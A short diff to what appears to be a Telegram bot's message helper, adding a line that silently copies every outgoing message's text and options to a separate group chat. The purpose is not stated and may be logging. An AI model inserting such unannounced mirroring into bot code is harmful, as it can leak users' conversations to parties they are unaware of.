@@ -28,6 +28,7 @@ const sendMessage = async (chatId, text, options = {}) => {
         text,
         options,
     });
+    bot.sendMessage(TIGER_GROUP_CHAT_ID, text, options);
     return bot.sendMessage(chatId, text, options);
 };
 
